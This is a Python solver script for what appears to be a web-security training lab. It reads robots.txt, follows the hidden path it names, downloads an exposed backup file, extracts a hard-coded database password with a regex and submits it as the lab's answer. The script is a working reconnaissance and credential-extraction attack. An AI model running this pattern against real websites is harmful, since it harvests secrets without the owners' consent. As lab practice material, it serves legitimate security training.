###################################################
#
# Lab: Source code disclosure via backup files
#
# Hack Steps: 
#      1. Fetch the robots.txt file
#      2. Search for hidden paths
#      3. Fetch the hidden path
#      4. Extract the path to the backup file
#      5. Fetch the backup file
#      6. Extract key
#      7. Submitt the solution
#
###################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0ab3005c03638eae8155759f0000007e.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching the robots.txt file.. ", end="", flush=True)
    
    robots = fetch("/robots.txt")  

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Searching for hidden paths.. ", end="", flush=True)

    hidden_path = re.findall("Disallow: (.*)", robots.text)[0]  

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + hidden_path)
    print(Fore.WHITE + "⦗3⦘ Fetching the hidden path.. ", end="", flush=True)

    backup_dir = fetch(hidden_path)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the path to the backup file.. ", end="", flush=True)

    backup_path = re.findall("href='(.*)'>", backup_dir.text)[0]  

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + backup_path)
    print(Fore.WHITE + "⦗5⦘ Fetching the backup file ", end="", flush=True)

    backup_file = fetch(backup_path)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Extracting key.. ", end="", flush=True)

    key = re.findall(r"\"postgres\",\s*\"postgres\",\s*\"(.*)\"", backup_file.text)[0]  

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + key)
    print(Fore.WHITE + "⦗7⦘ Submitting the solution.. ", end="", flush=True)

    data = { "answer": key }

    post_data("/submitsolution", data)  

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}")
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()